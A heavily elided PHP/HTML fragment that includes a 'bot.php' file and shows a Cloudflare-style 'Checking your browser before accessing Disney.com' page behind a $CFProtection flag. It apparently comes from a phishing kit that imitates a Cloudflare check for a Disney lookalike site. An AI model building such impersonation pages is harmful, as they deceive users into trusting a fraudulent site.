...
include '../extra/bot.php';
    ...
    if (isset($CFProtection) && $CFProtection == "no") {
                    ...
                    <td valign="middle" align="center">
                        <div class="cf-browser-verification cf-im-under-attack">
                            ...
                            <div id="cf-content" style="display: block;">
                                ...
                                <h1>
                                    <span data-translate="checking_browser">Checking your browser before accessing </span> Disney.com
                                </h1>
